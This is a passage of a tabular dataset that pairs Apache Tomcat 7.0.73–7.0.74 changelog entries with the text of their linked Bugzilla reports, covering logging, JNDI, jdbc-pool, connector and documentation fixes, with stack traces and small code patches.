3. Maybe time to ditch Java 5 compatibility ?  .. meaning do what other JDBC Pools do and let Connection.isValid() be the default."|https://bz.apache.org/bugzilla/show_bug.cgi?id=60194
jdbc-pool|Tomcat 7.0.74 (violetagg)|fix|60398|Fix testcase of TestSlowQueryReport. (kfujino)|unit test of TestSlowQueryReport is failed|"the test case testFastSql is failed.
the cause is SlowQueryReport add method reportQuery but not change the test case"|https://bz.apache.org/bugzilla/show_bug.cgi?id=60398
jdbc-pool|Tomcat 7.0.74 (violetagg)|add||Enable reset the statistics without restarting the pool. (kfujino)|||
Other|Tomcat 7.0.74 (violetagg)|fix|60366|Change catalina.bat to use directly LOGGING_MANAGER and LOGGING_CONFIG variables in order to configure logging, instead of modifying JAVA_OPTS. Patch provided by Petter Isberg. (violetagg)|catalina.bat should not modify $JAVA_OPTS to add $LOGGING_MANAGER|"catalina.bat adds logging manager and logging configuration parameters to JAVA_OPTS. This can cause issues when sub-processes are spawned. As far as I understand, the sub-process tries to use java.util.logging but throws an ClassNotFoundException because org.apache.juli.ClassLoaderLogManager is not on classpath.

This has already been solved for catalina.sh back in 2013, see bug 54601 for further explanations (https://bz.apache.org/bugzilla/show_bug.cgi?id=54601)

The same issuses as described in bug 54601, with Jenkins and Gradle, are still present in the Windows version of Tomcat 8.5.8. Since the catalina.bat file looks the same in this regard for tomcat 7 and 9 it is reasonable to believe these versions are affected as well.

A solution similar to the one for catalina.sh solves the issue for me.

Remove the assignments to JAVA_OPTS in lines 213 and 218 and add the LOGGING_CONFIG and LOGGING_MANAGER variables to where the JAVA_OPTS is used in lines 336, 339, 343, 346

208 if not ""%LOGGING_CONFIG%"" == """" goto noJuliConfig
209 set LOGGING_CONFIG=-Dnop
210 if not exist ""%CATALINA_BASE%\conf\logging.properties"" goto noJuliConfig
211 set LOGGING_CONFIG=-Djava.util.logging.config.file=""%CATALINA_BASE%\conf\logging.properties""
212 :noJuliConfig
213 - set ""JAVA_OPTS=%JAVA_OPTS% %LOGGING_CONFIG%""
214
215 if not ""%LOGGING_MANAGER%"" == """" goto noJuliManager
216 set LOGGING_MANAGER=-Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager
217 :noJuliManager
218 - set ""JAVA_OPTS=%JAVA_OPTS% %LOGGING_MANAGER%""

336 - %_EXECJAVA% %JAVA_OPTS% %CATALINA_OPTS% %DEBUG_OPTS% -classpath ""%CLASSPATH%""
336 + %_EXECJAVA% %LOGGING_CONFIG% %LOGGING_MANAGER% %JAVA_OPTS% %CATALINA_OPTS% %DEBUG_OPTS% -classpath ""%CLASSPATH%"""|https://bz.apache.org/bugzilla/show_bug.cgi?id=60366
Other|Tomcat 7.0.74 (violetagg)|add||New property is added test.verbose in order to control whether the output of the tests is displayed on the console or not. Patch provided by Emmanuel Bourg. (violetagg)|||
Other|Tomcat 7.0.74 (violetagg)|update||Update the ASF logos used in the Apache Tomcat installer for Windows to use the new versions.|||
Other|Tomcat 7.0.74 (violetagg)|fix||Spelling corrections provided by Josh Soref. (violetagg)|||
Catalina|Tomcat 7.0.73 (violetagg)|fix|60117|Ensure that the name of LogLevel is localized when using OneLineFormatter. Patch provided by Tatsuya Bessho. (kfujino)|OneLineFormatter doesn't localize the log level.|"Created attachment 34236 [details]
patch against trunk.

I set ""-Duser.language=ja"".
The Log level is always output in English.
This means my setting is ignored.
The Log level should be localized."|https://bz.apache.org/bugzilla/show_bug.cgi?id=60117
Catalina|Tomcat 7.0.73 (violetagg)|add|60151|Improve the exception error messages when a ResourceLink fails to specify the type, specifies an unknown type or specifies the wrong type. (markt)|JNDI Datasource lookup failure - throws javax.naming.NamingException|"After upgrading from Tomcat 8.0.32 to 8.0.37 all bases using Datasources started failing.

Start of forensics:

19-Sep-2016 10:45:49.046 WARNING [localhost-startStop-1] org.apache.naming.NamingContext.lookup Unexpected exception resolving reference
 java.lang.NullPointerException
        at java.lang.Class.forName0(Native Method)
        at java.lang.Class.forName(Class.java:348)
        at org.apache.naming.factory.ResourceLinkFactory.getObjectInstance(ResourceLinkFactory.java:150)
        at javax.naming.spi.NamingManager.getObjectInstance(NamingManager.java:321)
        at org.apache.naming.NamingContext.lookup(NamingContext.java:847)
        at org.apache.naming.NamingContext.lookup(NamingContext.java:158)
        at org.apache.naming.NamingContext.lookup(NamingContext.java:835)
        at org.apache.naming.NamingContext.lookup(NamingContext.java:158)
        at org.apache.naming.NamingContext.lookup(NamingContext.java:835)
        at org.apache.naming.NamingContext.lookup(NamingContext.java:158)
        at org.apache.naming.NamingContext.lookup(NamingContext.java:835)
        at org.apache.naming.NamingContext.lookup(NamingContext.java:172)
        at org.apache.naming.SelectorContext.lookup(SelectorContext.java:157)
        at javax.naming.InitialContext.lookup(InitialContext.java:417)
        at org.springframework.jndi.JndiTemplate$1.doInContext(JndiTemplate.java:155)
        at org.springframework.jndi.JndiTemplate.execute(JndiTemplate.java:87)
        at org.springframework.jndi.JndiTemplate.lookup(JndiTemplate.java:152)
        at org.springframework.jndi.JndiTemplate.lookup(JndiTemplate.java:179)
        at org.springframework.jndi.JndiLocatorSupport.lookup(JndiLocatorSupport.java:95)
        at org.springframework.jdbc.datasource.lookup.JndiDataSourceLookup.getDataSource(JndiDataSourceLookup.java:45)
        at org.springframework.boot.autoconfigure.jdbc.JndiDataSourceAutoConfiguration.dataSource(JndiDataSourceAutoConfiguration.java:58)
        at org.springframework.boot.autoconfigure.jdbc.JndiDataSourceAutoConfiguration$$EnhancerBySpringCGLIB$$6f321833.CGLIB$dataSource$0(<generated>)
        at org.springframework.boot.autoconfigure.jdbc.JndiDataSourceAutoConfiguration$$EnhancerBySpringCGLIB$$6f321833$$FastClassBySpringCGLIB$$9024b67d.invoke(<generated>)
        at org.springframework.cglib.proxy.MethodProxy.invokeSuper(MethodProxy.java:228)
        at org.springframework.context.annotation.ConfigurationClassEnhancer$BeanMethodInterceptor.intercept(ConfigurationClassEnhancer.java:355)
        at org.springframework.boot.autoconfigure.jdbc.JndiDataSourceAutoConfiguration$$EnhancerBySpringCGLIB$$6f321833.dataSource(<generated>)
        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
        at java.lang.reflect.Method.invoke(Method.java:498)
        at org.springframework.beans.factory.support.SimpleInstantiationStrategy.instantiate(SimpleInstantiationStrategy.java:162)
        at org.springframework.beans.factory.support.ConstructorResolver.instantiateUsingFactoryMethod(ConstructorResolver.java:588)
        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.instantiateUsingFactoryMethod(AbstractAutowireCapableBeanFactory.java:1123)
        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBeanInstance(AbstractAutowireCapableBeanFactory.java:1018)
        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:510)
        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:482)
        at org.springframework.beans.factory.support.AbstractBeanFactory$1.getObject(AbstractBeanFactory.java:306)
        at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:230)
        at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:302)
        at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:197)
        at org.springframework.beans.factory.support.DefaultListableBeanFactory.findAutowireCandidates(DefaultListableBeanFactory.java:1192)
        at org.springframework.beans.factory.support.DefaultListableBeanFactory.doResolveDependency(DefaultListableBeanFactory.java:1116)
        at org.springframework.beans.factory.support.DefaultListableBeanFactory.resolveDependency(DefaultListableBeanFactory.java:1014)
        at org.springframework.beans.factory.annotation.AutowiredAnnotationBeanPostProcessor$AutowiredFieldElement.inject(AutowiredAnnotationBeanPostProcessor.java:545)
        at org.springframework.beans.factory.annotation.InjectionMetadata.inject(InjectionMetadata.java:88)
        at org.springframework.beans.factory.annotation.AutowiredAnnotationBeanPostProcessor.postProcessPropertyValues(AutowiredAnnotationBeanPostProcessor.java:331)
        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.populateBean(AbstractAutowireCapableBeanFactory.java:1214)
        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:543)
        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:482)
        at org.springframework.beans.factory.support.AbstractBeanFactory$1.getObject(AbstractBeanFactory.java:306)
        at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:230)
        at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:302)
        at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:197)
        at org.springframework.beans.factory.support.ConstructorResolver.instantiateUsingFactoryMethod(ConstructorResolver.java:368)
        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.instantiateUsingFactoryMethod(AbstractAutowireCapableBeanFactory.java:1123)
        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBeanInstance(AbstractAutowireCapableBeanFactory.java:1018)
        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:510)
        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:482)
        at org.springframework.beans.factory.support.AbstractBeanFactory$1.getObject(AbstractBeanFactory.java:306)
        at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:230)
        at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:302)
        at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:197)
        at org.springframework.beans.factory.support.DefaultListableBeanFactory.findAutowireCandidates(DefaultListableBeanFactory.java:1192)
        at org.springframework.beans.factory.support.DefaultListableBeanFactory.doResolveDependency(DefaultListableBeanFactory.java:1116)
        at org.springframework.beans.factory.support.DefaultListableBeanFactory.resolveDependency(DefaultListableBeanFactory.java:1014)
        at org.springframework.beans.factory.support.ConstructorResolver.resolveAutowiredArgument(ConstructorResolver.java:813)
        at org.springframework.beans.factory.support.ConstructorResolver.createArgumentArray(ConstructorResolver.java:741)
        at org.springframework.beans.factory.support.ConstructorResolver.autowireConstructor(ConstructorResolver.java:185)
        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.autowireConstructor(AbstractAutowireCapableBeanFactory.java:1143)
        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBeanInstance(AbstractAutowireCapableBeanFactory.java:1046)
        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:510)
        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:482)
        at org.springframework.beans.factory.support.AbstractBeanFactory$1.getObject(AbstractBeanFactory.java:306)
        at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:230)
        at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:302)
        at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:197)
        at org.springframework.beans.factory.support.DefaultListableBeanFactory.findAutowireCandidates(DefaultListableBeanFactory.java:1192)
        at org.springframework.beans.factory.support.DefaultListableBeanFactory.doResolveDependency(DefaultListableBeanFactory.java:1116)
        at org.springframework.beans.factory.support.DefaultListableBeanFactory.resolveDependency(DefaultListableBeanFactory.java:1014)
        at org.springframework.beans.factory.support.ConstructorResolver.resolveAutowiredArgument(ConstructorResolver.java:813)
        at org.springframework.beans.factory.support.ConstructorResolver.createArgumentArray(ConstructorResolver.java:741)
        at org.springframework.beans.factory.support.ConstructorResolver.autowireConstructor(ConstructorResolver.java:185)
        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.autowireConstructor(AbstractAutowireCapableBeanFactory.java:1143)
        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBeanInstance(AbstractAutowireCapableBeanFactory.java:1046)
        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:510)
        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:482)
        at org.springframework.beans.factory.support.AbstractBeanFactory$1.getObject(AbstractBeanFactory.java:306)
        at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:230)
        at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:302)
        at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:197)
        at org.springframework.beans.factory.support.DefaultListableBeanFactory.findAutowireCandidates(DefaultListableBeanFactory.java:1192)
        at org.springframework.beans.factory.support.DefaultListableBeanFactory.doResolveDependency(DefaultListableBeanFactory.java:1116)
        at org.springframework.beans.factory.support.DefaultListableBeanFactory.resolveDependency(DefaultListableBeanFactory.java:1014)
        at org.springframework.beans.factory.annotation.AutowiredAnnotationBeanPostProcessor$AutowiredFieldElement.inject(AutowiredAnnotationBeanPostProcessor.java:545)
        at org.springframework.beans.factory.annotation.InjectionMetadata.inject(InjectionMetadata.java:88)
        at org.springframework.beans.factory.annotation.AutowiredAnnotationBeanPostProcessor.postProcessPropertyValues(AutowiredAnnotationBeanPostProcessor.java:331)
        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.populateBean(AbstractAutowireCapableBeanFactory.java:1214)
        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:543)
        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:482)
        at org.springframework.beans.factory.support.AbstractBeanFactory$1.getObject(AbstractBeanFactory.java:306)
        at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:230)
        at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:302)
        at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:197)
        at org.springframework.beans.factory.support.DefaultListableBeanFactory.preInstantiateSingletons(DefaultListableBeanFactory.java:772)
        at org.springframework.context.support.AbstractApplicationContext.finishBeanFactoryInitialization(AbstractApplicationContext.java:839)
        at org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:538)
        at org.springframework.boot.context.embedded.EmbeddedWebApplicationContext.refresh(EmbeddedWebApplicationContext.java:118)
        at org.springframework.boot.SpringApplication.refresh(SpringApplication.java:766)
        at org.springframework.boot.SpringApplication.createAndRefreshContext(SpringApplication.java:361)
        at org.springframework.boot.SpringApplication.run(SpringApplication.java:307)
        at org.springframework.boot.context.web.SpringBootServletInitializer.run(SpringBootServletInitializer.java:149)
        at org.springframework.boot.context.web.SpringBootServletInitializer.createRootApplicationContext(SpringBootServletInitializer.java:129)
        at org.springframework.boot.context.web.SpringBootServletInitializer.onStartup(SpringBootServletInitializer.java:85)
        at org.springframework.web.SpringServletContainerInitializer.onStartup(SpringServletContainerInitializer.java:175)
        at org.apache.catalina.core.StandardContext.startInternal(StandardContext.java:5303)
        at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:145)
        at org.apache.catalina.core.ContainerBase.addChildInternal(ContainerBase.java:725)
        at org.apache.catalina.core.ContainerBase.addChild(ContainerBase.java:701)
        at org.apache.catalina.core.StandardHost.addChild(StandardHost.java:717)
        at org.apache.catalina.startup.HostConfig.deployWAR(HostConfig.java:940)
        at org.apache.catalina.startup.HostConfig$DeployWar.run(HostConfig.java:1816)
        at java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:511)
        at java.util.concurrent.FutureTask.run(FutureTask.java:266)
        at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142)
        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617)
        at java.lang.Thread.run(Thread.java:745)


which ultimately leads to

19-Sep-2016 10:45:49.064 SEVERE [localhost-startStop-1] org.apache.catalina.core.ContainerBase.addChildInternal ContainerBase.addChild: start:
 org.apache.catalina.LifecycleException: Failed to start component [StandardEngine[Catalina].StandardHost[localhost].StandardContext[]]
        at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:162)
        at org.apache.catalina.core.ContainerBase.addChildInternal(ContainerBase.java:725)
        at org.apache.catalina.core.ContainerBase.addChild(ContainerBase.java:701)
        at org.apache.catalina.core.StandardHost.addChild(StandardHost.java:717)
        at org.apache.catalina.startup.HostConfig.deployWAR(HostConfig.java:940)
        at org.apache.catalina.startup.HostConfig$DeployWar.run(HostConfig.java:1816)
        at java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:511)
        at java.util.concurrent.FutureTask.run(FutureTask.java:266)
        at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142)
        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617)
        at java.lang.Thread.run(Thread.java:745)

Caused by: org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'parkeringsomradeResource': Injection of autowired dependencies failed; nested exception is 
<snip/>
org.springframework.beans.BeanInstantiationException: Failed to instantiate [javax.sql.DataSource]: Factory method 'dataSource' threw exception; nested exception is org.springframework.jdbc.datasource.lookup.DataSourceLookupFailureException: Failed to look up JNDI DataSource with name 'java:comp/env/jdbc/parkregcache'; nested exception is javax.naming.NamingException; nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'org.springframework.boot.autoconfigure.jdbc.DataSourceAutoConfiguration$JdbcTemplateConfiguration': Injection of autowired dependencies failed; nested exception is org.springframework.beans.factory.BeanCreationException: Could not autowire field: private javax.sql.DataSource org.springframework.boot.autoconfigure.jdbc.DataSourceAutoConfiguration$JdbcTemplateConfiguration.dataSource; nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'dataSource' defined in class path resource [org/springframework/boot/autoconfigure/jdbc/JndiDataSourceAutoConfiguration.class]: Bean instantiation via factory method failed; nested exception is org.springframework.beans.BeanInstantiationException: Failed to instantiate [javax.sql.DataSource]: Factory method 'dataSource' threw exception; nested exception is org.springframework.jdbc.datasource.lookup.DataSourceLookupFailureException: Failed to look up JNDI DataSource with name 'java:comp/env/jdbc/parkregcache'; nested exception is javax.naming.NamingException


After downgrading to Tomcat 8.0.36 all bases started working again.

I can unicast complete stacktraces and configuration if needed."|https://bz.apache.org/bugzilla/show_bug.cgi?id=60151
Catalina|Tomcat 7.0.73 (violetagg)|fix|60167|Ignore empty lines in /etc/passwd files when using the PasswdUserDatabase. (markt)|PasswdUserDatabase cannot parsing /etc/passwd with empty-line|"summary:

  When PasswdUserDatabase initialize @/etc/passwd/@ with empty-line,
  cannot parsing completely.

  * https://tomcat.apache.org/tomcat-8.0-doc/config/host.html#User_Web_Applications


========================================================

my /etc/passwd:

  <...>
  lxc-dnsmasq:x:114:125:LXC dnsmasq,,,:/var/lib/lxc:/bin/false
  moodle:x:1002:1002:,,,:/home/moodle:/bin/bash
  tomcat8:x:117:126::/usr/share/tomcat8:/bin/false
  
  
  # ÏãúÏä§ÌÖú Í¥ÄÎ¶¨Ïûê
  
  jehos:x:1001:1001:ÏÑ±Ï†úÌò∏,,,:/home/jehos:/bin/bash
  <...>


========================================================

try:
  GET http://localhost:8080/~myid

expect:
  ~myid/public_html/index.html

actual:
  404 not found

workaround:
  remove all empty-lines,
  in my case, just comment out (#)

suspect:
  https://github.com/apache/tomcat/blob/trunk/java/org/apache/catalina/startup/PasswdUserDatabase.java#L147"|https://bz.apache.org/bugzilla/show_bug.cgi?id=60167
Catalina|Tomcat 7.0.73 (violetagg)|fix||Improve the access checks for linked global resources to handle the case where the current class loader is a child of the web application class loader. (markt)|||
Catalina|Tomcat 7.0.73 (violetagg)|fix|60199|Log a warning if deserialization issues prevent a session attribute from being loaded. (markt)|Improve error message if a session attribute could not load due to deserialization problems|"Again and again I find myself in searching for classes that do not implement Serializable interface but are set into session. When you have such a class you just see in the log at tomcat start that there was a problem while deserializing the session object. I would be very helpful if the log would say which attribute have caused the problem.

Sample implementation StandardSession.java in doReadObject(ObjectInputStream stream):

Instead of:

        for (int i = 0; i < n; i++) {
            String name = (String) stream.readObject();
            Object value = stream.readObject();
            if ((value instanceof String) && (value.equals(NOT_SERIALIZED)))
                continue;
            if (manager.getContext().getLogger().isDebugEnabled())
                manager.getContext().getLogger().debug(""  loading attribute '"" + name +
                    ""' with value '"" + value + ""'"");
            attributes.put(name, value);
        }

do:


        for (int i = 0; i < n; i++) {
            String name = (String) stream.readObject();

            Object value = null;
            try {
                value = stream.readObject();
            } catch (Exception e) {
                manager.getContext().getLogger().error(String.format(""Attribute %s could not be deserialized due to %s"", name, e.getMessage()));
            }

            if ((value instanceof String) && (value.equals(NOT_SERIALIZED)))
                continue;

            if (manager.getContext().getLogger().isDebugEnabled())
                manager.getContext().getLogger().debug(""  loading attribute '"" + name +
                    ""' with value '"" + value + ""'"");
            attributes.put(name, value);
        }"|https://bz.apache.org/bugzilla/show_bug.cgi?id=60199
Catalina|Tomcat 7.0.73 (violetagg)|fix||Correctly test for control characters when reading the provided shutdown password. (markt)|||
Catalina|Tomcat 7.0.73 (violetagg)|fix||When configuring the JMX remote listener, specify the allowed types for the credentials. (markt)|||
Coyote|Tomcat 7.0.73 (violetagg)|fix|60123|Avoid potential threading issues that could cause excessively large vales to be returned for the processing time of a current request. (markt)|Tomcat JMX requestProcessingTime sometimes reports a request processor with decades of runtime (since 1-1-1970)|"We have an application that periodically monitors JMX ""Catalina:type=RequestProcessor,worker=*,name=*"" and looks at each entry returned from that wildcard, getting requestProcessingTime.  e.g., code with lines like this:

    ObjectName requestProcessorWildcard = new ObjectName(""Catalina:type=RequestProcessor,worker=*,name=*"");
    Set<ObjectName> mbeans = mbs.queryNames(requestProcessorWildcard, null);
    for (ObjectName name : mbeans) {
        // Get ""processing time"" for the current request, if any
        long currentReqProcTime = getLongValue(mbs, name, ""requestProcessingTime"") / 60000;

We sometimes see requestProcessingTime returning a value suggesting the request started on 1-1-1970, currently 46+ years ago.  Looking at Tomcat 7.0.57 source code (as what I have available to look at), I see this method in java/org/apache/coyote/RequestInfo.java:

    public long getRequestProcessingTime() {
        if ( getStage() == org.apache.coyote.Constants.STAGE_ENDED ) return 0;
        else return (System.currentTimeMillis() - req.getStartTime());
    }

Clearly, if req.getStartTime() == 0, this method will return a nonsensical request processing time.  This method ought to make sure the start time isn't zero before doing the subtraction.  When we see this, the request processor reports itself to be in stage 3 ... aka ""STAGE_SERVICE"".  Clearly the requests weren't started in 1970.  We don't know how the request is in the stage ""service"" but has its start time zeroed.

Note that the person in this thread http://osdir.com/ml/users-tomcat.apache.org/2016-06/msg00204.html was probably experiencing the same flaw.  If you do the math 1466499689496 msec corresponds to the time span from 1-1-70 to Tue, 21 Jun 2016 09:01:29.496 GMT ... and the EMail was posted on 21 June 2016!  I haven't followed the code through to see what can cause this to occur."|https://bz.apache.org/bugzilla/show_bug.cgi?id=60123
Coyote|Tomcat 7.0.73 (violetagg)|fix|60174|Log instances of HeadersTooLargeException during request processing. (markt)|HeadersTooLargeException should be logged|"Today I wasted a few hours with debugging my application, and later in the tomcat code, why some of my requests return just a HTTP 500, while the response objects do have the correct return code, even in the localhost_access_log.

Jersey was set to trace mode, so it is writing a lot of response header data, and there was a hidden HeadersTooLargeException while processing which leads to the 500 response code. There was no log and no sign in the response hinting to look at the response headers. There should be at least an log entry if that exception occures."|https://bz.apache.org/bugzilla/show_bug.cgi?id=60174
Coyote|Tomcat 7.0.73 (violetagg)|fix||Correct the HTTP header parser so that DEL is not treated as a valid token character. (markt)|||
Coyote|Tomcat 7.0.73 (violetagg)|fix|60319|When using an Executor, disconnect it from the Connector attributes maxThreads, minSpareThreads and threadPriority to enable the configuration settings to be consistently reported. These Connector attributes will be reported as -1 when an Executor is in use. The values used by the executor may be set and obtained via the Executor. (markt)|Executor limits reported via JMX can be inconsistent|"When a connector is configured with an external executor JMX allows the min/max threads to be set either directly via the executor or via the connector/protocol/endpoint. If set via the connector/protocol/endpoint the reported current settings can be inconsistent.

I'm not convinced that allowing the executor settings to be set via the connector/protocol/endpoint was a good idea. I'm currently considering changing the implementation along the following lines:
- calls to setters only change settings for internal exectuor
- if an external executor is configured, getters always return '-1' or similar"|https://bz.apache.org/bugzilla/show_bug.cgi?id=60319
Coyote|Tomcat 7.0.73 (violetagg)|fix||If an I/O error occurs during async processing on a non-container thread, ensure that the onError() event is triggered. (markt)|||
Coyote|Tomcat 7.0.73 (violetagg)|fix||Improve detection of I/O errors during async processing on non-container threads and trigger async error handling when they are detected. (markt)|||
Coyote|Tomcat 7.0.73 (violetagg)|add||Add additional checks for valid characters to the HTTP request line parsing so invalid request lines are rejected sooner. (markt)|||
Web applications|Tomcat 7.0.73 (violetagg)|add||Add an example of using the classesToInitialize attribute of the JreMemoryLeakPreventionListener to the documentation web application. Based on a patch by Cris Berneburg. (markt)|||
Web applications|Tomcat 7.0.73 (violetagg)|fix|60192|Correct a typo in the status output of the Manager application. Patch provided by Radhakrishna Pemmasani. (markt)|There is a typographical error at 2 places|"There is a typographical error in the manager at this line "" Keeped alive sockets count: "". It should be kept alive sockets count or keep alive sockets count.

This is present at

 tomcat/java/org/apache/catalina/manager/StatusTransformer.java

line 308"|https://bz.apache.org/bugzilla/show_bug.cgi?id=60192
Web applications|Tomcat 7.0.73 (violetagg)|fix||Correct a typo in HTTP Connector How-To. Issue reported via comments.apache.org. (violetagg)|||
Web applications|Tomcat 7.0.73 (violetagg)|fix||Fix default value of validationInterval attribute in jdbc-pool. (kfujino)|||
Web applications|Tomcat 7.0.73 (violetagg)|fix||Correct a typo in CGI How-To. Issue reported via comments.apache.org. (violetagg)|||
Web applications|Tomcat 7.0.73 (violetagg)|fix|60344|Add a note to BUILDING.txt regarding using the source bundle with the correct line endings. (markt)|Update documentation to clearly document how we handle line endings||https://bz.apache.org/bugzilla/show_bug.cgi?id=60344
Tribes|Tomcat 7.0.73 (violetagg)|fix||When the proxy node sends a backup retrieve message, ensure that using the channelSendOptions that has been set rather than the default channelSendOptions. (kfujino)|||
jdbc-pool|Tomcat 7.0.73 (violetagg)|fix|60099|Ensure that use all method arguments as a cache key when using StatementCache. (kfujino)|StatementCache does not check the scrollable type of result set when searching for a cached statement|"Created attachment 34224 [details]
Test class

When the StatementCache is searching for a matching PreparedStatement, the matching criteria do not take into account the scrollable type of result set, but only the sql query.

If we create a PreparedStatement with a FORWARD_ONLY result set type, and then we try to create another PreparedStatement with a SCROLL_INSENSITIVE type with the same query, then the cache will return the PreparedStatement created first(a FORWARD_ONLY statement), and any attempt to call the absolute method will throw a java.sql.SQLException: The 'absolute()' method is only allowed on scroll cursors.

Please find attached a Test Class that can help to reproduce the problem. To run this class you need to add derby-10.11, tomcat-jdbc-8.0.37 and tomcat-juli-8.0.37 to classpath. I am using jdk1.8.0_92 to compile and execute this test.

P.S. The error only appears when creating a PreparedStatement instead of a Statement (by calling createStatement()).

Please tell me, if you need more informations.

Thanks for your help!

Full StackTrace:
Exception in thread ""main"" java.sql.SQLException: The 'absolute()' method is only allowed on scroll cursors.
	at org.apache.derby.impl.jdbc.SQLExceptionFactory.getSQLException(Unknown Source)
	at org.apache.derby.impl.jdbc.SQLExceptionFactory.getSQLException(Unknown Source)
	at org.apache.derby.impl.jdbc.Util.generateCsSQLException(Unknown Source)
	at org.apache.derby.impl.jdbc.Util.generateCsSQLException(Unknown Source)
	at org.apache.derby.impl.jdbc.EmbedResultSet.checkScrollCursor(Unknown Source)
	at org.apache.derby.impl.jdbc.EmbedResultSet.absolute(Unknown Source)
	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
	at java.lang.reflect.Method.invoke(Method.java:498)
	at org.apache.tomcat.jdbc.pool.interceptor.StatementDecoratorInterceptor$ResultSetProxy.invoke(StatementDecoratorInterceptor.java:307)
	at com.sun.proxy.$Proxy4.absolute(Unknown Source)
	at test.Test.testWithInsensitiveResultSet(Test.java:75)
	at test.Test.main(Test.java:18)
Caused by: ERROR XJ061: The 'absolute()' method is only allowed on scroll cursors.
	at org.apache.derby.iapi.error.StandardException.newException(Unknown Source)
	at org.apache.derby.impl.jdbc.SQLExceptionFactory.wrapArgsForTransportAcrossDRDA(Unknown Source)
	... 14 more"|https://bz.apache.org/bugzilla/show_bug.cgi?id=60099
jdbc-pool|Tomcat 7.0.73 (violetagg)|fix|60139|Correct Javadocs for PoolConfiguration.getValidationInterval and setValidationInterval. Reported by Phillip Webb. (kfujino)|Incorrect javadoc on PoolConfiguration.setValidationInterval|"Issue https://bz.apache.org/bugzilla/show_bug.cgi?id=59923 updated the default validationInterval, however, the Javadoc on PoolConfiguration was not updated:


    /**
     * avoid excess validation, only run validation at most at this frequency - time in milliseconds.
     * If a connection is due for validation, but has been validated previously
     * within this interval, it will not be validated again.
     * The default value is 30000 (30 seconds).
     * @param validationInterval the validation interval in milliseconds
     */
